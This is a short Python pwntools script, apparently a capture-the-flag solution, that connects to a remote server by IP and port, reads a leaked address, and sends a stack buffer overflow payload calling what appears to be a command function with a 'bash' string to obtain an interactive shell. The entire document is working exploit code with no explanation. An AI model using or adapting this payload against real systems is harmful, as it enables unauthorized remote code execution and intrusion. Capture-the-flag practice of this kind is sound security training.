from pwn import *

elf = ELF('./weapon')
#io = process('./weapon')
io = remote('61.28.237.24', 30201)

print(io.recvline())
base = int(io.recv().split()[-1], 16)
cmd = base -84
bash = base+3337

payload = b'A'*4+b'B'*4+b'C'*4+b'D'*4+b'E'*4+b'F'*4+b'J'*4+p32(cmd)+b'A'*4+p32(bash)
pause()
io.sendline(payload)
io.interactive()
